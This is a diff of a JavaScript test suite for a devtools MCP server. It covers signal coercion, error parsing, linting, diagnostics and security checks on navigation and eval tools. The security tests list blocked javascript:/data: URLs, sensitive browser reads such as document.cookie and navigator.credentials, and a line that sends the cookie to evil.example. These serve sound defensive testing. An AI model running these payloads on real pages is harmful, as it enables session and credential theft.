@@ -1,499 +1,267 @@
 /**
- * Unit tests for the devtools-mcp audit fixes:
+ * Earlier audit fixes, kept as regressions:
  *   - P0-2: what_set_signal JSON coercion (no double-stringify)
  *   - P1-7: what_errors stack parsing (file/line/component extracted)
  *   - P1-8: what_page_map per-category budgets
- *   - P2-3: what_perf hides noisy largestSubscribers when max == 1
- *   - P2-8: what_lint destructured-props + module-scope-signal-missing-name
+ *   - P2-3: what_diagnose hides noisy subscriber rankings when max == 1
+ *   - what_navigate URL validation
+ *   - what_eval: only the fixed safe reads run without --unsafe-eval
+ *   - P2-8: what_lint runs eslint-plugin-what's rules by name (moved imports, unnamed module-scope signals)
  *
- * Uses the InMemoryTransport pattern from tools.test.js so the server's
- * registered tools are exercised end-to-end without a real WebSocket.
+ * Real bridge, scripted page (test/helpers/fake-page.js).
  */
 
 import { describe, it, afterEach } from 'node:test';
 import assert from 'node:assert/strict';
-import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
-import { Client } from '@modelcontextprotocol/sdk/client/index.js';
-import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
-import { registerTools } from '../src/tools.js';
-import { registerExtendedTools } from '../src/tools-extended.js';
+import { startBridge, connectPage, connectTools } from './helpers/fake-page.js';
 import { registerAgentTools } from '../src/tools-agent.js';
 
-function makeBridge(opts = {}) {
-  const snapshot = opts.snapshot || {
-    signals: [{ id: 85, name: 'items', value: [] }],
-    effects: [],
-    components: [{ id: 1, name: 'TaskList' }],
-    errors: [],
+let cleanups = [];
+async function setup({ state, handle } = {}) {
+  const started = await startBridge();
+  cleanups.push(() => started.close());
+  const connecting = connectPage(started.bridge, {
+    state: state || { signals: [{ id: 85, name: 'items', rev: 0, value: [] }], effects: [], components: [{ id: 1, name: 'TaskList', parentId: null }] },
+    handle,
+  });
+  cleanups.push(() => connecting.close());
+  const page = await connecting.ready;
+  const tools = await connectTools(started.bridge);
+  cleanups.push(() => tools.close());
+  registerAgentTools(tools.server, started.bridge);
+  return { page, call: async (name, args) => (await tools.call(name, args)).parsed };
+}
+
+afterEach(async () => {
+  for (const cleanup of cleanups.reverse()) await cleanup();
+  cleanups = [];
+});
+
+const settle = () => new Promise((resolve) => setTimeout(resolve, 30));
+
+describe('P0-2 — what_set_signal JSON coercion', () => {
+  const sentValue = async (value) => {
+    const { page, call } = await setup();
+    await call('what_set_signal', { signalId: 85, value });
+    return page.received.find((m) => m.command === 'set-signal').args.value;
   };
-  const errorLog = opts.errors || [];
-  return {
-    isConnected: () => opts.connected !== false,
-    getSnapshot: () => snapshot,
-    refreshSnapshot: async () => snapshot,
-    getOrRefreshSnapshot: async () => snapshot,
-    getCacheSnapshot: async () => [],
-    getEvents: () => [],
-    getErrors: () => errorLog,
-    saveBaseline: () => true,
-    getBaseline: () => snapshot,
-    sendCommand: opts.sendCommand || (async (cmd, _args) => ({ error: `unhandled: ${cmd}` })),
-    close: () => {},
-  };
-}
 
-async function setup(bridgeOpts) {
-  const bridge = makeBridge(bridgeOpts);
-  const server = new McpServer({ name: 't', version: '0.0.1' });
-  registerTools(server, bridge);
-  registerExtendedTools(server, bridge);
-  registerAgentTools(server, bridge);
-  const [ct, st] = InMemoryTransport.createLinkedPair();
-  const client = new Client({ name: 'c', version: '0.0.1' });
-  await Promise.all([server.connect(st), client.connect(ct)]);
-  return { client, server, bridge };
-}
-
-async function call(client, name, args = {}) {
-  const r = await client.callTool({ name, arguments: args });
-  const text = r.content[0]?.text;
-  return text ? JSON.parse(text) : null;
-}
-
-describe('audit fixes', () => {
-  let client, server;
-  afterEach(async () => {
-    try { await client?.close(); } catch {}
-    try { await server?.close(); } catch {}
+  it('parses stringified array payloads into native arrays', async () => {
+    const value = await sentValue('[{"id":1,"name":"X"},{"id":2,"name":"Y"}]');
+    assert.ok(Array.isArray(value));
+    assert.equal(value[1].id, 2);
   });
 
-  describe('P0-2 — what_set_signal JSON coercion', () => {
-    it('parses stringified array payloads into native arrays', async () => {
-      let received = null;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd, args) => {
-          if (cmd === 'set-signal') { received = args; return { previous: [], current: args.value }; }
-          return { error: 'nope' };
-        },
-      }));
-      // Agent passes a JSON-encoded string (the broken case).
-      await call(client, 'what_set_signal', {
-        signalId: 85,
-        value: '[{"id":1,"name":"X"},{"id":2,"name":"Y"}]',
-      });
-      assert.ok(received, 'set-signal command was forwarded');
-      assert.ok(Array.isArray(received.value), `expected array, got ${typeof received.value}`);
-      assert.equal(received.value.length, 2);
-      assert.equal(received.value[0].id, 1);
-    });
-
-    it('parses stringified number into native number', async () => {
-      let received = null;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd, args) => {
-          if (cmd === 'set-signal') { received = args; return { previous: 0, current: args.value }; }
-        },
-      }));
-      await call(client, 'what_set_signal', { signalId: 85, value: '42' });
-      assert.equal(typeof received.value, 'number');
-      assert.equal(received.value, 42);
-    });
-
-    it('leaves plain user strings alone', async () => {
-      let received = null;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd, args) => {
-          if (cmd === 'set-signal') { received = args; return { previous: '', current: args.value }; }
-        },
-      }));
-      await call(client, 'what_set_signal', { signalId: 85, value: 'hello world' });
-      assert.equal(received.value, 'hello world');
-    });
-
-    it('passes native arrays through untouched', async () => {
-      let received = null;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd, args) => {
-          if (cmd === 'set-signal') { received = args; return { previous: [], current: args.value }; }
-        },
-      }));
-      await call(client, 'what_set_signal', { signalId: 85, value: [{ id: 1 }] });
-      assert.ok(Array.isArray(received.value));
-      assert.equal(received.value[0].id, 1);
-    });
+  it('parses stringified number into native number', async () => {
+    assert.equal(await sentValue('42'), 42);
   });
 
-  describe('P1-7 — what_errors stack parsing', () => {
-    it('extracts file/line and component from a typical V8 stack', async () => {
-      const stack = [
+  it('leaves plain user strings alone', async () => {
+    assert.equal(await sentValue('hello world'), 'hello world');
+  });
+
+  it('passes native arrays through untouched', async () => {
+    assert.deepEqual(await sentValue([{ id: 1 }]), [{ id: 1 }]);
+  });
+});
+
+describe('P1-7 — what_errors stack parsing', () => {
+  it('extracts file/line and component from a typical V8 stack', async () => {
+    const { page, call } = await setup();
+    page.push('component:mounted', { id: 7, name: 'TaskList', parentId: null });
+    page.push('error:captured', {
+      message: 'count is not defined',
+      type: 'uncaught',
+      stack: [
         'Error: count is not defined',
         '    at TaskList (http://localhost:5173/src/components/TaskList.jsx:42:13)',
         '    at runComponent (http://localhost:5173/node_modules/.vite/deps/what-core.js:200:5)',
-      ].join('\n');
-      ({ client, server } = await setup({
-        snapshot: { signals: [], effects: [], components: [{ id: 7, name: 'TaskList' }], errors: [] },
-        errors: [{ message: 'count is not defined', stack, timestamp: Date.now() }],
-      }));
-      const out = await call(client, 'what_errors');
-      assert.equal(out.count, 1);
-      const err = out.errors[0];
-      assert.ok(err.file?.includes('TaskList.jsx'), `file: ${err.file}`);
-      assert.equal(err.line, 42);
-      assert.equal(err.column, 13);
-      assert.equal(err.component, 'TaskList');
-      // A suggestion of some kind is attached (specific pattern matchers in
-      // tools.js may override the generic inferSuggestion; we just confirm
-      // the field is populated and isn't the bare default).
-      assert.ok(err.suggestion && err.suggestion.length > 10, err.suggestion);
+      ].join('\n'),
     });
+    await settle();
+    const err = (await call('what_errors')).errors[0];
+    assert.ok(err.at.endsWith('TaskList.jsx:42:13'), err.at);
+    assert.equal(err.component, 'TaskList');
+    assert.ok(err.hint.includes("'count'"), err.hint);
+  });
 
-    it('skips framework internal frames when picking file/line', async () => {
-      const stack = [
+  it('skips framework internal frames when picking file/line', async () => {
+    const { page, call } = await setup();
+    page.push('error:captured', {
+      message: 'x.foo is not a function',
+      type: 'uncaught',
+      stack: [
         'TypeError: x.foo is not a function',
         '    at notify (http://localhost:5173/node_modules/what-core/src/reactive.js:10:1)',
         '    at MyComp (http://localhost:5173/src/MyComp.jsx:8:3)',
-      ].join('\n');
-      ({ client, server } = await setup({
-        snapshot: { signals: [], effects: [], components: [], errors: [] },
-        errors: [{ message: 'x.foo is not a function', stack, timestamp: Date.now() }],
-      }));
-      const out = await call(client, 'what_errors');
-      assert.ok(out.errors[0].file?.endsWith('MyComp.jsx'), out.errors[0].file);
-      assert.equal(out.errors[0].line, 8);
+      ].join('\n'),
     });
+    await settle();
+    assert.ok((await call('what_errors')).errors[0].at.endsWith('MyComp.jsx:8:3'));
+  });
+});
+
+describe('P1-8 — what_page_map per-category budgets', () => {
+  it('returns headings/components even when there are many landmarks', async () => {
+    const { call } = await setup({
+      handle: (command) => (command === 'page-map' ? {
+        viewport: { width: 1280, height: 720 },
+        landmarks: Array.from({ length: 250 }, (_, i) => ({ tag: 'section', text: `l${i}`, rect: {} })),
+        interactives: [],
+        headings: Array.from({ length: 12 }, (_, i) => ({ level: 2, text: `h${i}` })),
+        components: Array.from({ length: 5 }, (_, i) => ({ id: i, name: `C${i}` })),
+        totalElements: 267,
+      } : undefined),
+    });
+    const out = await call('what_page_map');
+    assert.ok(out.headings.length >= 1);
+    assert.ok(out.components.length >= 1);
+  });
+});
+
+describe('P2-3 — what_diagnose suppresses a noisy subscriber ranking', () => {
+  const effect = (id, name, depSignalIds, runCount) => ({ id, name, kind: 'effect', runCount, depSignalIds, depComputedIds: [] });
+
+  it('omits mostSubscribed when no signal has more than one subscriber', async () => {
+    const { call } = await setup({ state: {
+      signals: [{ id: 1, name: 'a', rev: 0, value: 0 }, { id: 2, name: 'b', rev: 0, value: 0 }],
+      effects: [effect(1, 'e1', [1], 1), effect(2, 'e2', [2], 1)],
+      components: [],
+    } });
+    assert.equal((await call('what_diagnose', { focus: 'performance' })).mostSubscribed, undefined);
   });
 
-  describe('P1-8 — what_page_map per-category budgets', () => {
-    it('returns headings/components even when there are many landmarks', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async (cmd) => {
-          if (cmd === 'page-map') {
-            // Server now returns its own budgeted slices; in the real client
-            // implementation the budget is per-category. We exercise the
-            // server-side serialization path with a representative payload.
-            return {
-              viewport: { width: 1280, height: 720 },
-              landmarks: Array.from({ length: 250 }, (_, i) => ({ tag: 'section', text: `l${i}`, rect: {} })),
-              interactives: [],
-              headings: Array.from({ length: 12 }, (_, i) => ({ level: 2, text: `h${i}` })),
-              components: Array.from({ length: 5 }, (_, i) => ({ id: i, name: `C${i}` })),
-              totalElements: 267,
-            };
-          }
-        },
-      }));
-      const out = await call(client, 'what_page_map');
-      assert.ok(out.headings.length >= 1, 'headings should not be empty');
-      assert.ok(out.components.length >= 1, 'components should not be empty');
-    });
+  it('ranks signals with 2+ subscribers', async () => {
+    const { call } = await setup({ state: {
+      signals: [{ id: 1, name: 'a', rev: 0, value: 0 }],
+      effects: [effect(1, 'e1', [1], 1), effect(2, 'e2', [1], 1)],
+      components: [],
+    } });
+    assert.deepEqual((await call('what_diagnose', { focus: 'performance' })).mostSubscribed, ['a#1 ×2']);
   });
 
-  describe('P2-3 — what_perf suppresses noisy largestSubscribers', () => {
-    it('omits largestSubscribers when max subscriberCount is 1', async () => {
-      ({ client, server } = await setup({
-        snapshot: {
-          signals: [{ id: 1, name: 'a', value: 0 }, { id: 2, name: 'b', value: 0 }],
-          effects: [
-            { id: 1, name: 'e1', depSignalIds: [1], runCount: 1 },
-            { id: 2, name: 'e2', depSignalIds: [2], runCount: 1 },
-          ],
-          components: [],
-          errors: [],
-        },
-      }));
-      const out = await call(client, 'what_perf');
-      assert.equal(out.largestSubscribers, undefined,
-        'largestSubscribers should be omitted when max is 1');
-    });
+  it('ranks hot effects by runs above the threshold', async () => {
+    const { call } = await setup({ state: {
+      signals: [{ id: 1, name: 'a', rev: 0, value: 0 }],
+      effects: [effect(1, 'cool', [1], 3), effect(2, 'hot', [1], 200), effect(3, 'warm', [1], 60)],
+      components: [],
+    } });
+    const out = await call('what_diagnose', { focus: 'performance', threshold: 50 });
+    assert.deepEqual(out.hotEffects, ['hot#2 ×200', 'warm#3 ×60']);
+  });
+});
 
-    it('includes largestSubscribers when a signal has 2+ subscribers', async () => {
-      ({ client, server } = await setup({
-        snapshot: {
-          signals: [{ id: 1, name: 'a', value: 0 }],
-          effects: [
-            { id: 1, name: 'e1', depSignalIds: [1], runCount: 1 },
-            { id: 2, name: 'e2', depSignalIds: [1], runCount: 1 },
-          ],
-          components: [],
-          errors: [],
-        },
-      }));
-      const out = await call(client, 'what_perf');
-      assert.ok(Array.isArray(out.largestSubscribers));
-      assert.equal(out.largestSubscribers[0].subscriberCount, 2);
+describe('what_navigate URL validation', () => {
+  const navigate = (command, args) => (command === 'navigate'
+    ? { requested: args.path, browser: { path: args.path }, router: null, settled: true }
+    : undefined);
+
+  for (const path of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>', 'vbscript:msgbox', '\njavascript:alert(1)']) {
+    it(`rejects ${JSON.stringify(path)}`, async () => {
+      const { page, call } = await setup();
+      const out = await call('what_navigate', { path });
+      assert.ok(/Blocked|unsafe/.test(out.error), out.error);
+      assert.ok(!page.received.some((m) => m.command === 'navigate'), 'nothing reached the page');
     });
+  }
+
+  for (const path of ['/dashboard', './relative', '#hash', '?query=1', 'https://example.com']) {
+    it(`allows ${path}`, async () => {
+      const { page, call } = await setup({ handle: navigate });
+      const out = await call('what_navigate', { path });
+      assert.ok(!out.error, out.error);
+      assert.ok(page.received.some((m) => m.command === 'navigate'));
+      assert.equal(out.settled, true);
+    });
+  }
+});
+
+describe('what_eval without --unsafe-eval: only the fixed safe reads', () => {
+  const reader = (command, args) => (command === 'read' ? { path: args.path, value: `value of ${args.path}` } : undefined);
+
+  for (const code of ['document.title', 'window.location.href', 'navigator.userAgent', ' location.pathname ']) {
+    it(`reads ${code.trim()} through the read command, never eval`, async () => {
+      const { page, call } = await setup({ handle: reader });
+      const out = await call('what_eval', { code });
+      assert.ok(!out.error, out.error);
+      const sent = page.received.filter((m) => m.command === 'read' || m.command === 'eval');
+      assert.deepEqual(sent.map((m) => m.command), ['read']);
+      assert.equal(out.result, `«value of ${code.trim().replace(/^window\./, '')}»`);
+    });
+  }
+
+  for (const code of [
+    'window.constructor', 'window.constructor.constructor', 'document.__proto__', 'Object.prototype',
+    'window["eval"]', '', 'document', 'document.cookie', 'window.localStorage', 'window.sessionStorage',
+    'window.indexedDB', 'navigator.credentials', 'window.document.cookie', 'window.opener',
+    'document.body.innerHTML', 'fetch("https://evil.example/" + document.cookie)',
+  ]) {
+    it(`refuses ${JSON.stringify(code)} before anything reaches the page`, async () => {
+      const { page, call } = await setup({ handle: reader });
+      const out = await call('what_eval', { code });
+      assert.match(out.error, /disabled for arbitrary code/);
+      assert.ok(!page.received.some((m) => m.command === 'read' || m.command === 'eval'));
+    });
+  }
+});
+
+describe('P2-8 — what_lint rules shared with eslint-plugin-what', () => {
+  it('runs one named rule and reports its catalogue code', async () => {
+    const { call } = await setup();
+    const code = "import { useForm } from 'what-framework';\nexport const form = useForm;\n";
+    const out = await call('what_lint', { code, rules: ['no-moved-imports'] });
+    assert.equal(out.issues[0].code, 'ERR_MOVED_IMPORT');
+    assert.equal(out.issues[0].rule, 'no-moved-imports');
   });
 
-  // =========================================================================
-  // URL validation in what_navigate
-  // =========================================================================
-  describe('what_navigate URL validation', () => {
-    it('rejects javascript: URL', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ navigatedTo: '/', currentPath: '/' }),
-      }));
-      const out = await call(client, 'what_navigate', { path: 'javascript:alert(1)' });
-      assert.ok(out.error, 'should be an error');
-      assert.ok(out.error.includes('Blocked') || out.error.includes('unsafe'));
-    });
+  it('flags module-scope signals missing a debug name', async () => {
+    const { call } = await setup();
+    const code = "import { signal } from 'what-framework';\nexport const todos = signal([]);\nexport const count = signal(0, 'count');\n";
+    const messages = (await call('what_lint', { code, rules: ['signal-debug-name'] })).issues.map((i) => i.message).join('\n');
+    assert.match(messages, /todos/);
+    assert.doesNotMatch(messages, /'count'/);
+  });
+});
 
-    it('rejects mixed-case JaVaScRiPt: URL', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ navigatedTo: '/', currentPath: '/' }),
-      }));
-      const out = await call(client, 'what_navigate', { path: 'JaVaScRiPt:alert(1)' });
-      assert.ok(out.error, 'mixed-case should be rejected');
-    });
-
-    it('rejects data: URL', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ navigatedTo: '/', currentPath: '/' }),
-      }));
-      const out = await call(client, 'what_navigate', { path: 'data:text/html,<script>' });
-      assert.ok(out.error, 'data: should be rejected');
-    });
-
-    it('rejects vbscript: URL', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ navigatedTo: '/', currentPath: '/' }),
-      }));
-      const out = await call(client, 'what_navigate', { path: 'vbscript:msgbox' });
-      assert.ok(out.error, 'vbscript: should be rejected');
-    });
-
-    it('rejects newline-prefixed javascript: URL', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ navigatedTo: '/', currentPath: '/' }),
-      }));
-      const out = await call(client, 'what_navigate', { path: '\njavascript:alert(1)' });
-      assert.ok(out.error, 'newline-prefixed should be rejected');
-    });
-
-    it('allows /dashboard', async () => {
-      let navigated = false;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd) => {
-          if (cmd === 'navigate') { navigated = true; return { navigatedTo: '/dashboard', currentPath: '/dashboard', success: true }; }
-          return { error: 'nope' };
-        },
-      }));
-      const out = await call(client, 'what_navigate', { path: '/dashboard' });
-      assert.ok(!out.error, `unexpected error: ${out.error}`);
-      assert.ok(navigated, 'navigate command should have been sent');
-    });
-
-    it('allows ./relative', async () => {
-      let navigated = false;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd) => {
-          if (cmd === 'navigate') { navigated = true; return { navigatedTo: './relative', currentPath: '/', success: true }; }
-          return { error: 'nope' };
-        },
-      }));
-      const out = await call(client, 'what_navigate', { path: './relative' });
-      assert.ok(!out.error);
-      assert.ok(navigated);
-    });
-
-    it('allows #hash', async () => {
-      let navigated = false;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd) => {
-          if (cmd === 'navigate') { navigated = true; return { navigatedTo: '#hash', currentPath: '/', success: true }; }
-          return { error: 'nope' };
-        },
-      }));
-      const out = await call(client, 'what_navigate', { path: '#hash' });
-      assert.ok(!out.error);
-      assert.ok(navigated);
-    });
-
-    it('allows ?query=1', async () => {
-      let navigated = false;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd) => {
-          if (cmd === 'navigate') { navigated = true; return { navigatedTo: '?query=1', currentPath: '/', success: true }; }
-          return { error: 'nope' };
-        },
-      }));
-      const out = await call(client, 'what_navigate', { path: '?query=1' });
-      assert.ok(!out.error);
-      assert.ok(navigated);
-    });
-
-    it('allows https://example.com', async () => {
-      let navigated = false;
-      ({ client, server } = await setup({
-        sendCommand: async (cmd) => {
-          if (cmd === 'navigate') { navigated = true; return { navigatedTo: 'https://example.com', currentPath: '/', success: true }; }
-          return { error: 'nope' };
-        },
-      }));
-      const out = await call(client, 'what_navigate', { path: 'https://example.com' });
-      assert.ok(!out.error, `unexpected error: ${out.error}`);
-      assert.ok(navigated);
-    });
+describe('verifier regressions', () => {
+  it('prioritizes written user signals and reports shared computed work', async () => {
+    const signals = [
+      ...Array.from({ length: 12 }, (_, i) => ({ id: i + 1, name: `what-router:${i}`, rev: 3 })),
+      { id: 13, name: 'cart', rev: 2, loc: 'src/Lab.js:10:16', owner: '<Lab>' },
+      { id: 14, name: 'rows', rev: 5 },
+    ];
+    const effects = Array.from({ length: 3 }, (_, i) => ({
+      id: i + 1, name: `computed_${i + 1}`, loc: 'src/Row.js:2:4',
+      componentId: i + 1, kind: 'computed', depSignalIds: [14], runCount: 6,
+    }));
+    const components = effects.map((e) => ({ id: e.componentId, name: 'Row' }));
+    const { call } = await setup({ state: { signals, effects, components } });
+    const diagnosed = await call('what_diagnose');
+    assert.equal(diagnosed.unreadSignals.written, 1);
+    assert.deepEqual(diagnosed.unreadSignals.sample[0], { id: 13, name: 'cart', loc: 'src/Lab.js:10:16', owner: '<Lab>', writes: 2 });
+    assert.deepEqual(diagnosed.repeatedComputeds, [{ owner: '<Row>', loc: 'src/Row.js:2:4', count: 3, runs: 18, signals: ['rows#14'] }]);
+    assert.match(diagnosed.status, /unreadSignals/);
+    assert.match(diagnosed.status, /hotEffects/);
   });
 
-  // =========================================================================
-  // isSafeRead denylist via what_eval
-  // =========================================================================
-  describe('isSafeRead denylist (what_eval without unsafe flag)', () => {
-    // what_eval allows safe read-only expressions without --unsafe-eval.
-    // We test the boundary by calling what_eval with known safe/unsafe expressions.
-    // The tool returns an error for unsafe expressions.
-
-    it('allows window.location.href (safe dotted read)', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async (cmd, _args) => {
-          if (cmd === 'eval') return { result: 'http://localhost', type: 'string', executionTime: 0 };
-          return { error: 'nope' };
-        },
-      }));
-      const out = await call(client, 'what_eval', { code: 'window.location.href' });
-      // Should NOT be an error — safe read
-      assert.ok(!out.error, `should be allowed: ${out.error}`);
-    });
-
-    it('allows document.title', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ result: 'My App', type: 'string', executionTime: 0 }),
-      }));
-      const out = await call(client, 'what_eval', { code: 'document.title' });
-      assert.ok(!out.error, `should be allowed: ${out.error}`);
-    });
-
-    it('allows navigator.userAgent', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ result: 'Mozilla/5.0', type: 'string', executionTime: 0 }),
-      }));
-      const out = await call(client, 'what_eval', { code: 'navigator.userAgent' });
-      assert.ok(!out.error);
-    });
-
-    it('rejects window.constructor (proto denylist)', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.constructor' });
-      assert.ok(out.error, 'constructor should be rejected');
-    });
-
-    it('rejects window.constructor.constructor', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.constructor.constructor' });
-      assert.ok(out.error);
-    });
-
-    it('rejects document.__proto__', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'document.__proto__' });
-      assert.ok(out.error);
-    });
-
-    it('rejects Object.prototype (not a safe global)', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'Object.prototype' });
-      assert.ok(out.error, 'Object is not in safe globals');
-    });
-
-    it('rejects bracket notation (window["eval"])', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window["eval"]' });
-      assert.ok(out.error, 'brackets should fail simple ident check');
-    });
-
-    it('rejects empty string', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: '' });
-      assert.ok(out.error, 'empty string should be rejected');
-    });
-
-    it('rejects single-segment expression (just "document")', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'document' });
-      assert.ok(out.error, 'single segment needs >= 2 segments');
-    });
-
-    // --- Sensitive property paths (secrets/state exfiltration) ---
-    // These pass the structural safe-read check (dotted idents on a safe
-    // global) but must still require WHAT_UNSAFE_EVAL. Regression guard for
-    // the document.cookie leak.
-
-    it('rejects document.cookie without WHAT_UNSAFE_EVAL', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'document.cookie' });
-      assert.ok(out.error, 'document.cookie must be rejected in safe mode');
-    });
-
-    it('rejects window.localStorage', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.localStorage' });
-      assert.ok(out.error);
-    });
-
-    it('rejects window.sessionStorage', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.sessionStorage' });
-      assert.ok(out.error);
-    });
-
-    it('rejects window.indexedDB', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.indexedDB' });
-      assert.ok(out.error);
-    });
-
-    it('rejects navigator.credentials', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'navigator.credentials' });
-      assert.ok(out.error);
-    });
-
-    it('rejects nested sensitive segment (window.document.cookie)', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.document.cookie' });
-      assert.ok(out.error, 'denylist must apply to every segment, not just the second');
-    });
-
-    it('rejects window.opener', async () => {
-      ({ client, server } = await setup());
-      const out = await call(client, 'what_eval', { code: 'window.opener' });
-      assert.ok(out.error);
-    });
-
-    it('still allows document.title after denylist addition', async () => {
-      ({ client, server } = await setup({
-        sendCommand: async () => ({ result: 'My App', type: 'string', executionTime: 0 }),
-      }));
-      const out = await call(client, 'what_eval', { code: 'document.title' });
-      assert.ok(!out.error, `should be allowed: ${out.error}`);
-    });
+  it('surfaces stalled async work and a partial registry in orientation', async () => {
+    const effects = [{ id: 1, name: 'report', kind: 'computed', async: { status: 'unresolved', inFlight: { startedAt: Date.now() - 6000 } } }];
+    const { call } = await setup({ state: { signals: [], effects, components: [], droppedBeforeInstall: { signals: 0, effects: 3, components: 1 } } });
+    const status = await call('what_connection_status');
+    assert.equal(status.stalled.work[0].name, 'report');
+    assert.deepEqual(status.registry, { truncated: true, tracked: { signals: 0, effects: 1, components: 0 }, droppedBeforeInstall: { signals: 0, effects: 3, components: 1 } });
+    assert.deepEqual((await call('what_effects')).registry, status.registry);
   });
 
-  describe('P2-8 — new lint rules', () => {
-    it('flags destructured props inside a component body', async () => {
-      ({ client, server } = await setup());
-      const code = `
-function TodoItem(props) {
-  const { title, done } = props;
-  return <li>{title}</li>;
-}`;
-      const out = await call(client, 'what_lint', { code, rules: ['destructured-props-lose-reactivity'] });
-      assert.ok(out.issues.length >= 1, `expected at least one issue, got ${JSON.stringify(out.issues)}`);
-      assert.equal(out.issues[0].code, 'ERR_DESTRUCTURED_PROPS');
+  it('ships action completions and array invalidation targets', async () => {
+    const { page, call } = await setup({ handle: (command, args) => command === 'invalidate-cache' ? { invalidated: args.key } : undefined });
+    page.push('action', { name: 'addTodo', outcome: 'ok', invalidated: [], revalidated: [] });
+    await settle();
+    const log = await call('what_events', { types: ['action'] });
+    assert.equal(log.actions.length, 1);
+    assert.deepEqual(log.actions[0], {
+      seq: log.actions[0].seq, name: '«addTodo»', outcome: 'ok', invalidated: [], revalidated: [],
     });
-
-    it('flags module-scope signals missing a debug name', async () => {
-      ({ client, server } = await setup());
-      const code = `
-import { signal } from 'what-framework';
-export const todos = signal([]);
-export const count = signal(0, 'count');
-`;
-      const out = await call(client, 'what_lint', { code, rules: ['module-scope-signal-missing-name'] });
-      // Should flag `todos` but NOT `count`.
-      const messages = out.issues.map(i => i.message).join('\n');
-      assert.ok(/todos/.test(messages), `expected todos warning, got: ${messages}`);
-      assert.ok(!/'count'/.test(messages), `count should not be flagged: ${messages}`);
-    });
+    assert.deepEqual((await call('what_invalidate_cache', { key: ['todos'] })).invalidated, ['todos']);
   });
 });
